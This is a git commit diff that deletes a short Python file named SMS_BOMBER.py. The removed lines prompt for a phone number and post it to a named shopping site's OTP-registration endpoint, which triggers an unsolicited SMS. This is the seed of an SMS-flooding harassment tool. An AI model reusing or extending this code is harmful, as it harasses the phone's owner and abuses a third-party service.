db1034a5f6641f75fcac5451c5b7000a3dc8ed78
shaean56 <111380122+shaean56@users.noreply.github.com>
2022-09-04 03:50:19 +0800

    Delete SMS_BOMBER.py

--- SMS_BOMBER.py
+++
@@ -1,9 +0,0 @@
-from pyexpat import model
-import requests
-import time
-
-number = input("Inter your phone number (without 0) : ")
-url_namva = "https://api-react.okala.com/C/CustomerAccount/OTPRegister"
-json_namva = {"mobile":"0" + number,"deviceTypeCode":5,"confirmTerms":"true","notRobot":"false"}
-req = requests.post(url= url_namva,json= json_namva)
-print(req)
